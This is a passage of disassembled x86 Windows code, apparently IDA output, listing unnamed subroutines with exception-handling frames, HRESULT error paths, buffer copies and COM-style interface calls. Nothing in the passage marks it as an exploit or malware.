                jnz     short loc_17C21
                call    dword ptr ds:10011F4h

loc_17C21:                              ; CODE XREF: sub_17BB8+61↑j
                test    esi, esi
                jl      short loc_17C2A
                mov     esi, 80004005h

loc_17C2A:                              ; CODE XREF: sub_17BB8+43↑j
                                        ; sub_17BB8+6B↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     eax, esi
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    4
sub_17BB8       endp

; ---------------------------------------------------------------------------
                db 11h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17C58       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_8]
                push    edi
                mov     edi, [ebp+arg_4]
                push    edi
                push    100138Ch
                mov     dword ptr [esi], 0
                call    sub_17B08
                test    eax, eax
                jnz     short loc_17C89
                push    edi
                push    1001C7Ch
                call    sub_17B08
                test    eax, eax
                jz      short loc_17C9E

loc_17C89:                              ; CODE XREF: sub_17C58+20↑j
                mov     eax, [ebp+arg_0]
                mov     [esi], eax
                mov     ecx, [eax]
                mov     edx, [ecx+4]
                push    eax
                call    edx
                pop     edi
                xor     eax, eax
                pop     esi
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_17C9E:                              ; CODE XREF: sub_17C58+2F↑j
                pop     edi
                mov     eax, 80004002h
                pop     esi
                pop     ebp
                retn    0Ch
sub_17C58       endp

; ---------------------------------------------------------------------------
                db 0Fh dup(0CCh)
; ---------------------------------------------------------------------------
                mov     eax, 1
                retn    4
; ---------------------------------------------------------------------------
                db 8 dup(0CCh)
; ---------------------------------------------------------------------------
                mov     eax, 1
                retn    4
; ---------------------------------------------------------------------------
                db 8 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17CD8       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_0]
                add     ecx, 4
                call    sub_19028
                mov     ecx, [ebp+arg_4]
                mov     [ecx], eax
                xor     eax, eax
                pop     ebp
                retn    8
sub_17CD8       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================


sub_17CF8       proc near               ; CODE XREF: sub_196C8+1C↓p
                mov     eax, [ecx+1220h]
                retn
sub_17CF8       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17D08       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+1224h], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_17D08       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17D28       proc near               ; CODE XREF: sub_1B138+27↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_0]
                mov     ecx, [ecx+1224h]
                test    ecx, ecx
                mov     eax, 80004001h
                jz      short loc_17D45
                mov     edx, [ebp+arg_4]
                push    edx
                call    ecx

loc_17D45:                              ; CODE XREF: sub_17D28+15↑j
                pop     ebp
                retn    8
sub_17D28       endp

; ---------------------------------------------------------------------------
                db 0Fh dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_17D58       proc near               ; CODE XREF: sub_1A6D8+1B6↓p
                lea     eax, [ecx+0E10h]
                retn
sub_17D58       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17D68       proc near               ; CODE XREF: sub_183A8+81↓p
                                        ; sub_18A58+49↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, ecx
                mov     ecx, [ebp+arg_0]
                mov     [eax], ecx
                mov     dword ptr [eax+4], 0
                pop     ebp
                retn    4
sub_17D68       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17D88       proc near               ; CODE XREF: sub_17DE8+DD↓p
                                        ; sub_183A8+A7↓p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                test    eax, eax
                jl      short loc_17D97
                mov     eax, [ebp+arg_4]

loc_17D97:                              ; CODE XREF: sub_17D88+A↑j
                pop     ebp
                retn    8
sub_17D88       endp

; ---------------------------------------------------------------------------
                db 0Dh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17DA8       proc near               ; CODE XREF: sub_19E98+5F↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                push    eax
                call    sub_18CA8
                pop     ebp
                retn
sub_17DA8       endp

; ---------------------------------------------------------------------------
                db 0Dh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17DC8       proc near               ; CODE XREF: sub_19AE8+5B↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                test    eax, eax
                jz      short loc_17DDD
                mov     ecx, [ebp+arg_4]
                push    eax
                call    sub_18D68

loc_17DDD:                              ; CODE XREF: sub_17DC8+A↑j
                pop     ebp
                retn
sub_17DC8       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17DE8       proc near               ; CODE XREF: sub_183A8+A0↓p

var_30          = dword ptr -30h
var_2C          = dword ptr -2Ch
var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AA90h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 20h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     edi, ecx
                xor     ebx, ebx
                xor     esi, esi
                mov     [ebp+var_1C], esi
                mov     [ebp+var_24], ebx
                mov     [ebp+var_4], ebx
                call    sub_18F78
                test    eax, eax
                jz      loc_17EEB
                mov     [ebp+var_20], ebx
                mov     ecx, edi
                call    sub_18F78
                mov     ecx, [eax]
                lea     edx, [ebp+var_20]
                push    edx
                push    1001830h
                push    eax
                mov     eax, [ecx]
                call    eax
                mov     esi, eax
                mov     [ebp+var_1C], esi
                cmp     esi, ebx
                jl      loc_17EEB
                mov     eax, [ebp+var_20]
                cmp     eax, ebx
                jz      short loc_17EE3
                xor     esi, esi
                mov     [ebp+var_28], esi
                mov     [ebp+var_4], 1
                mov     ecx, [eax]
                mov     edx, [ebp+arg_4]
                push    edx
                mov     edx, [ebp+arg_0]
                push    edx
                push    eax
                mov     eax, [ecx+0Ch]
                call    eax
                mov     [ebp+var_1C], eax
                jmp     short loc_17EBD
; ---------------------------------------------------------------------------
                mov     ecx, [ebp+var_14]
                mov     edx, [ecx]
                mov     eax, [edx]
                mov     [ebp+var_2C], eax
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_2C]
                mov     [ebp+var_28], esi
                cmp     esi, 0C00000FDh
                jnz     short loc_17EAF
                call    dword ptr ds:10011F4h

loc_17EAF:                              ; CODE XREF: sub_17DE8+BF↑j
                xor     ebx, ebx
                cmp     esi, ebx
                jl      short loc_17EBD
                mov     esi, 80004005h
                mov     [ebp+var_28], esi

loc_17EBD:                              ; CODE XREF: sub_17DE8+9E↑j
                                        ; sub_17DE8+CB↑j
                mov     [ebp+var_4], ebx
                push    esi
                mov     ecx, [ebp+var_1C]
                push    ecx
                call    sub_17D88
                mov     esi, eax
                mov     [ebp+var_1C], esi
                mov     eax, [ebp+var_20]
                mov     edx, [eax]
                push    eax
                mov     eax, [edx+8]
                call    eax
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_17F32
; ---------------------------------------------------------------------------

loc_17EE3:                              ; CODE XREF: sub_17DE8+7D↑j
                mov     esi, 80070057h
                mov     [ebp+var_1C], esi

loc_17EEB:                              ; CODE XREF: sub_17DE8+4B↑j
                                        ; sub_17DE8+72↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_17F32
; ---------------------------------------------------------------------------
                mov     ecx, [ebp+var_14]
                mov     edx, [ecx]
                mov     eax, [edx]
                mov     [ebp+var_30], eax
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_30]
                mov     [ebp+var_24], esi
                cmp     esi, 0C00000FDh
                jnz     short loc_17F1B
                call    dword ptr ds:10011F4h

loc_17F1B:                              ; CODE XREF: sub_17DE8+12B↑j
                xor     ebx, ebx
                cmp     esi, ebx
                jl      short loc_17F28
                mov     [ebp+var_24], 80004005h

loc_17F28:                              ; CODE XREF: sub_17DE8+137↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     esi, [ebp+var_1C]

loc_17F32:                              ; CODE XREF: sub_17DE8+F9↑j
                                        ; sub_17DE8+10A↑j
                cmp     esi, ebx
                mov     eax, [ebp+var_24]
                jge     short loc_17F3B
                mov     eax, esi

loc_17F3B:                              ; CODE XREF: sub_17DE8+14F↑j
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    8
sub_17DE8       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17F58       proc near               ; CODE XREF: sub_18A58+7E↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_0]
                test    ecx, ecx
                mov     dword ptr [ecx], 0
                jz      short loc_17F6F
                call    sub_18DF8

loc_17F6F:                              ; CODE XREF: sub_17F58+10↑j
                pop     ebp
                retn    4
sub_17F58       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17F78       proc near

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AAB8h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 10h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                xor     ebx, ebx
                mov     [ebp+var_1C], ebx
                mov     edi, [ebp+arg_0]
                lea     ecx, [edi+4]
                call    sub_19028
                test    eax, eax
                jz      loc_18069
                push    4E20h
                mov     eax, [edi+10h]
                push    eax
                call    dword ptr ds:100104Ch
                cmp     eax, ebx
                jz      short loc_17FFF
                cmp     eax, 80h
                jz      short loc_17FFF
                call    dword ptr ds:1001144h
                cmp     eax, ebx
                jle     short loc_17FF3
                and     eax, 0FFFFh
                or      eax, 80070000h

loc_17FF3:                              ; CODE XREF: sub_17F78+6F↑j
                mov     esi, eax
                mov     ecx, [ebp+arg_4]
                call    sub_18F68
                jmp     short loc_18076
; ---------------------------------------------------------------------------

loc_17FFF:                              ; CODE XREF: sub_17F78+5E↑j
                                        ; sub_17F78+65↑j
                mov     [ebp+var_4], ebx
                mov     ecx, [ebp+arg_4]
                push    ecx
                mov     ecx, edi
                call    sub_17BB8
                mov     esi, eax
                mov     [ebp+var_1C], esi
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_18057
; ---------------------------------------------------------------------------
                mov     edx, [ebp+var_14]
                mov     eax, [edx]
                mov     ecx, [eax]
                mov     [ebp+var_20], ecx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_20]
                mov     ebx, esi
                cmp     esi, 0C00000FDh
                jnz     short loc_18041
                call    dword ptr ds:10011F4h

loc_18041:                              ; CODE XREF: sub_17F78+C1↑j
                test    esi, esi
                jl      short loc_1804A
                mov     ebx, 80004005h

loc_1804A:                              ; CODE XREF: sub_17F78+CB↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     edi, [ebp+arg_0]
                mov     esi, [ebp+var_1C]

loc_18057:                              ; CODE XREF: sub_17F78+A1↑j
                test    esi, esi
                jl      short loc_1805D
                mov     esi, ebx

loc_1805D:                              ; CODE XREF: sub_17F78+E1↑j
                mov     edx, [edi+10h]
                push    edx
                call    dword ptr ds:10010C4h
                jmp     short loc_18076
; ---------------------------------------------------------------------------

loc_18069:                              ; CODE XREF: sub_17F78+47↑j
                mov     eax, [ebp+arg_4]
                push    eax
                mov     ecx, edi
                call    sub_17BB8
                mov     esi, eax

loc_18076:                              ; CODE XREF: sub_17F78+85↑j
                                        ; sub_17F78+EF↑j
                mov     eax, esi
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    8
sub_17F78       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18098       proc near               ; CODE XREF: sub_18588+12B↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    edi
                mov     esi, ecx
                push    0D94h
                lea     ecx, [esi+0Ch]
                xor     edi, edi
                call    sub_18CA8
                test    eax, eax
                jz      short loc_180D7
                push    4E20h
                push    esi
                mov     ecx, eax
                call    sub_1A278
                test    eax, eax
                jnz     short loc_180EB
                mov     edx, [ebp+arg_0]
                mov     ecx, 8007000Eh
                pop     edi
                mov     [edx], eax
                mov     eax, ecx
                pop     esi
                pop     ebp
                retn    4
; ---------------------------------------------------------------------------

loc_180D7:                              ; CODE XREF: sub_18098+1A↑j
                mov     edx, [ebp+arg_0]
                xor     eax, eax
                mov     ecx, 8007000Eh
                pop     edi
                mov     [edx], eax
                mov     eax, ecx
                pop     esi
                pop     ebp
                retn    4
; ---------------------------------------------------------------------------

loc_180EB:                              ; CODE XREF: sub_18098+2B↑j
                mov     ecx, [ebp+arg_0]
                mov     [ecx], eax
                mov     eax, edi
                pop     edi
                pop     esi
                pop     ebp
                retn    4
sub_18098       endp

; ---------------------------------------------------------------------------
                db 10h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18108       proc near               ; CODE XREF: sub_19958+1E↓p

var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AAD8h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 14h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     edi, ecx
                mov     [ebp+var_24], edi
                xor     ebx, ebx
                xor     esi, esi
                mov     [ebp+var_1C], esi
                lea     eax, [edi+7Ch]
                mov     ecx, [ebp+arg_0]
                cmp     ecx, eax
                jnz     short loc_181B7
                mov     [ebp+var_4], ebx
                call    sub_19CE8
                mov     esi, eax
                mov     [ebp+var_1C], esi
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_181A5
; ---------------------------------------------------------------------------
                mov     ecx, [ebp+var_14]
                mov     edx, [ecx]
                mov     eax, [edx]
                mov     [ebp+var_20], eax
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_20]
                mov     ebx, esi
                cmp     esi, 0C00000FDh
                jnz     short loc_1818F
                call    dword ptr ds:10011F4h

loc_1818F:                              ; CODE XREF: sub_18108+7F↑j
                test    esi, esi
                jl      short loc_18198
                mov     ebx, 80004005h

loc_18198:                              ; CODE XREF: sub_18108+89↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     edi, [ebp+var_24]
                mov     esi, [ebp+var_1C]

loc_181A5:                              ; CODE XREF: sub_18108+5F↑j
                test    esi, esi
                jl      short loc_181AB
                mov     esi, ebx

loc_181AB:                              ; CODE XREF: sub_18108+9F↑j
                mov     ecx, [edi+14h]
                push    ecx
                call    dword ptr ds:10010C4h
                jmp     short loc_181C4
; ---------------------------------------------------------------------------

loc_181B7:                              ; CODE XREF: sub_18108+49↑j
                cmp     ecx, ebx
                jz      short loc_181C4
                push    ecx
                lea     ecx, [edi+0Ch]
                call    sub_18D68

loc_181C4:                              ; CODE XREF: sub_18108+AD↑j
                                        ; sub_18108+B1↑j
                mov     eax, esi
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    4
sub_18108       endp

; ---------------------------------------------------------------------------
                db 0Eh dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_181E8       proc near               ; CODE XREF: sub_183A8+93↓p
                                        ; sub_18A58+53↓p
                mov     eax, [ecx]
                test    eax, eax
                jz      short loc_1821C
                mov     edx, [ecx+4]
                cmp     edx, [eax+8]
                jb      short loc_18201
                mov     eax, [eax]
                mov     [ecx], eax
                mov     dword ptr [ecx+4], 0

loc_18201:                              ; CODE XREF: sub_181E8+C↑j
                mov     edx, [ecx]
                test    edx, edx
                jz      short loc_1821C
                mov     eax, [ecx+4]
                cmp     eax, [edx+8]
                jnb     short loc_1821C
                push    esi
                lea     esi, [eax+1]
                mov     [ecx+4], esi
                lea     eax, [edx+eax*4+10h]
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_1821C:                              ; CODE XREF: sub_181E8+4↑j
                                        ; sub_181E8+1D↑j ...
                xor     eax, eax
                retn
sub_181E8       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18228       proc near               ; CODE XREF: sub_18298+DE↓p
                                        ; sub_184D8+84↓p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = byte ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_4]
                xor     eax, eax
                test    ecx, ecx
                jz      short loc_1823E
                cmp     ecx, 7FFFFFFFh
                jbe     short loc_18243

loc_1823E:                              ; CODE XREF: sub_18228+C↑j
                mov     eax, 80070057h

loc_18243:                              ; CODE XREF: sub_18228+14↑j
                test    eax, eax
                jl      short loc_1828C
                mov     edx, [ebp+arg_8]
                push    ebx
                push    esi
                push    edi
                mov     edi, [ebp+arg_0]
                lea     esi, [ecx-1]
                mov     ecx, [ebp+arg_C]
                lea     eax, [ebp+arg_10]
                push    eax
                push    ecx
                push    edx
                push    esi
                push    edi
                xor     ebx, ebx
                call    dword ptr ds:10011F8h
                add     esp, 14h
                test    eax, eax
                jl      short loc_1827E
                cmp     eax, esi
                ja      short loc_1827E
                jnz     short loc_18287
                mov     [edi+esi*2], bx
                pop     edi
                pop     esi
                mov     eax, ebx
                pop     ebx
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_1827E:                              ; CODE XREF: sub_18228+43↑j
                                        ; sub_18228+47↑j
                mov     [edi+esi*2], bx
                mov     ebx, 8007007Ah

loc_18287:                              ; CODE XREF: sub_18228+49↑j
                pop     edi
                pop     esi
                mov     eax, ebx
                pop     ebx

loc_1828C:                              ; CODE XREF: sub_18228+1D↑j
                pop     ebp
                retn
sub_18228       endp

; ---------------------------------------------------------------------------
                db 0Ah dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18298       proc near               ; CODE XREF: sub_18828+93↓p
                                        ; sub_18828:loc_188D1↓p

var_A40         = byte ptr -0A40h
var_834         = byte ptr -834h
var_628         = byte ptr -628h
var_428         = word ptr -428h
var_41C         = byte ptr -41Ch
var_214         = word ptr -214h
var_210         = byte ptr -210h
var_20A         = word ptr -20Ah
var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 0A40h
                mov     eax, ds:100C088h
                xor     eax, ebp
                mov     [ebp+var_4], eax
                push    ebx
                push    esi
                push    edi
                push    104h
                lea     eax, [ebp+var_41C]
                push    eax
                xor     ebx, ebx
                push    ebx
                mov     edi, ecx
                xor     esi, esi
                call    dword ptr ds:1001064h
                push    eax
                call    dword ptr ds:1001060h
                test    eax, eax
                jbe     loc_1838F
                push    105h
                lea     ecx, [ebp+var_834]
                push    ecx
                push    105h
                lea     edx, [ebp+var_A40]
                push    edx
                push    105h
                lea     eax, [ebp+var_628]
                push    eax
                push    105h
                lea     ecx, [ebp+var_210]
                push    ecx
                lea     edx, [ebp+var_41C]
                push    edx
                mov     [ebp+var_214], bx
                call    dword ptr ds:1001200h
                push    ebx
                push    ebx
                lea     eax, [ebp+var_628]
                push    eax
                lea     ecx, [ebp+var_210]
                push    ecx
                lea     esi, [edi+1018h]
                push    104h
                push    esi
                mov     [ebp+var_20A], bx
                mov     [ebp+var_428], bx
                mov     [esi], bx
                call    dword ptr ds:10011FCh
                add     esp, 3Ch
                push    1001C60h
                push    esi
                mov     [edi+121Eh], bx
                call    sub_14E89
                push    eax
                push    1001C8Ch
                push    104h
                add     edi, 0E10h
                push    edi
                call    sub_18228
                add     esp, 18h
                pop     edi
                pop     esi
                pop     ebx
                mov     ecx, [ebp+var_4]
                xor     ecx, ebp
                call    sub_165AB
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_1838F:                              ; CODE XREF: sub_18298+3A↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                mov     eax, esi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    sub_165AB
                mov     esp, ebp
                pop     ebp
                retn
sub_18298       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_183A8       proc near               ; CODE XREF: sub_14A83+246↑p
                                        ; sub_1A6D8+98↓p

var_30          = byte ptr -30h
var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AAF8h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 20h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     edi, ecx
                mov     [ebp+var_28], edi
                xor     esi, esi
                mov     [ebp+var_20], esi
                push    4E20h
                mov     eax, [edi+10h]
                push    eax
                call    dword ptr ds:100104Ch
                cmp     eax, esi
                jz      short loc_1841C
                cmp     eax, 80h
                jz      short loc_1841C
                call    dword ptr ds:1001144h
                cmp     eax, esi
                jle     short loc_18415
                and     eax, 0FFFFh
                or      eax, 80070000h

loc_18415:                              ; CODE XREF: sub_183A8+61↑j
                mov     esi, eax
                jmp     loc_184B4
; ---------------------------------------------------------------------------

loc_1841C:                              ; CODE XREF: sub_183A8+50↑j
                                        ; sub_183A8+57↑j
                mov     [ebp+var_1C], esi
                mov     [ebp+var_4], esi
                lea     ecx, [edi+18h]
                push    ecx
                lea     ecx, [ebp+var_30]
                call    sub_17D68
                mov     ebx, [ebp+arg_0]
                lea     esp, [esp+0]

loc_18438:                              ; CODE XREF: sub_183A8+B1↓j
                lea     ecx, [ebp+var_30]
                call    sub_181E8
                test    eax, eax
                jz      short loc_1845B
                push    ebx
                push    edi
                mov     ecx, eax
                call    sub_17DE8
                push    eax
                push    esi
                call    sub_17D88
                mov     esi, eax
                mov     [ebp+var_20], esi
                jmp     short loc_18438
; ---------------------------------------------------------------------------

loc_1845B:                              ; CODE XREF: sub_183A8+9A↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_184A3
; ---------------------------------------------------------------------------
                mov     edx, [ebp+var_14]
                mov     eax, [edx]
                mov     ecx, [eax]
                mov     [ebp+var_24], ecx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_24]
                mov     [ebp+var_1C], esi
                cmp     esi, 0C00000FDh
                jnz     short loc_1848B
                call    dword ptr ds:10011F4h

loc_1848B:                              ; CODE XREF: sub_183A8+DB↑j
                test    esi, esi
                jl      short loc_18496
                mov     [ebp+var_1C], 80004005h

loc_18496:                              ; CODE XREF: sub_183A8+E5↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     edi, [ebp+var_28]
                mov     esi, [ebp+var_20]

loc_184A3:                              ; CODE XREF: sub_183A8+BA↑j
                mov     edx, [edi+10h]
                push    edx
                call    dword ptr ds:10010C4h
                test    esi, esi
                jl      short loc_184B4
                mov     esi, [ebp+var_1C]

loc_184B4:                              ; CODE XREF: sub_183A8+6F↑j
                                        ; sub_183A8+107↑j
                mov     eax, esi
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    4
sub_183A8       endp

; ---------------------------------------------------------------------------
                db 0Eh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_184D8       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_4]
                test    esi, esi
                mov     eax, 80070057h
                jz      loc_1856F
                mov     eax, [ebp+arg_0]
                push    ebx
                add     eax, 1018h
                push    edi
                xor     ebx, ebx
                mov     edi, 104h
                mov     ecx, eax
                sub     esi, eax
                jmp     short loc_18508
; ---------------------------------------------------------------------------
                align 4

loc_18508:                              ; CODE XREF: sub_184D8+2B↑j
                                        ; sub_184D8+4C↓j
                lea     edx, [edi+7FFFFEFAh]
                test    edx, edx
                jz      short loc_18528
                movzx   edx, word ptr [esi+ecx]
                test    dx, dx
                jz      short loc_18528
                mov     [ecx], dx
                add     ecx, 2
                sub     edi, 1
                jnz     short loc_18508
                jmp     short loc_1852C
; ---------------------------------------------------------------------------

loc_18528:                              ; CODE XREF: sub_184D8+38↑j
                                        ; sub_184D8+41↑j
                test    edi, edi
                jnz     short loc_18534

loc_1852C:                              ; CODE XREF: sub_184D8+4E↑j
                sub     ecx, 2
                mov     ebx, 8007007Ah

loc_18534:                              ; CODE XREF: sub_184D8+52↑j
                test    ebx, ebx
                mov     word ptr [ecx], 0
                jl      short loc_1856B
                push    1001C60h
                push    eax
                call    sub_14E89
                push    eax
                mov     eax, [ebp+arg_0]
                push    1001C8Ch
                add     eax, 0E10h
                push    104h
                push    eax
                call    sub_18228
                add     esp, 18h
                pop     edi
                pop     ebx
                pop     esi
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_1856B:                              ; CODE XREF: sub_184D8+63↑j
                pop     edi
                mov     eax, ebx
                pop     ebx

loc_1856F:                              ; CODE XREF: sub_184D8+10↑j
                pop     esi
                pop     ebp
                retn    8
sub_184D8       endp

; ---------------------------------------------------------------------------
                db 14h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18588       proc near

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AB18h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 10h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                xor     edi, edi
                mov     [ebp+var_1C], edi
                mov     eax, [ebp+arg_4]
                mov     [eax], edi
